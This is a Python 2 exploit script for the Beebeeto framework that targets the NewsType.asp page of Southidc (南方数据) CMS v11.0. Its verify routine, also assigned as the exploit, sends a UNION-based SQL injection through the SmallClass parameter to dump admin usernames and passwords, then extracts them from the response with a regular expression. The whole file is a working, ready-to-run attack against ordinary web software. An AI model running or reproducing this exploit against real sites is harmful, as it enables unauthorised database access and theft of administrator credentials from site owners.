#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0036',           # 由Beebeeto官方编辑
            'name': 'Southidc南方数据 v11.0 /NewsType.asp SQL注入漏洞 EXP',  # 名称
            'author': 'Bug',                   # 作者
            'create_date': '2014-09-28',    # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'southidc',  # 漏洞所涉及的应用名称
            'vul_version': ['11.0'],  # 受漏洞影响的应用版本
            'type': 'SQL Injection',  # 漏洞类型
            'tag': ['southidc', 'SQL注入漏洞', 'SQL Injection', '南方数据'],  # 漏洞相关tag
            'desc': 'southidc v10.0到v11.0版本中NewsType.asp文件对SmallClass参数没有适当过滤，导致SQL注入漏洞。',  # 漏洞描述
            'references': ['http://sebug.net/vuldb/ssvid-62399'],  # 参考链接
        },
    }


    @classmethod
    def verify(cls, args):
        exp = ("/NewsType.asp?SmallClass='%20union%20select%200,username%2BCHR(124)%2Bpassword"
               ",2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201"
               "=2%20and%20''='")
        verify_url = args['options']['target'] + exp
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(urllib2.Request(verify_url)).read()
        pattern = re.compile(r'.*?\">(?P<username>[a-zA-Z0-9]+)\|(?P<password>[a-zA-Z0-9]+)',re.I|re.S)
        match = pattern.match(content)
        if match == None:
            args['success'] = False
            return args
        username = match.group("username")
        password = match.group("password")
        args['success'] = True
        args['poc_ret']['vul_url'] = verify_url
        args['poc_ret']['Username'] = username
        args['poc_ret']['Password'] = password
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
